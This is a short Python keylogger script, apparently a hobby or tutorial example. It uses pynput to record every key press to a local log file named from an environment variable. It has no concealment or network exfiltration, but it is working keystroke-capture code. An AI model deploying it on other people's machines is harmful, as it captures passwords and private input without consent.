from pynput import keyboard
import logging
from Log_handler import createLogHandler
import os

title = os.environ['name']

logger = createLogHandler('Keylogger', title) 

def get_key_name(key):
	if isinstance(key, keyboard.KeyCode):
		return key.char
	else:
		a = str(key)
		return a[4:]

def on_press(key):
	key_name = get_key_name(key)
	logger.info(key_name)

def on_release(key):
	key_name = get_key_name(key)

	if key_name == None:
		logger.info('Exiting...')
		return False

with keyboard.Listener(
	on_press = on_press,
	on_release = on_release) as listener:
	listener.join()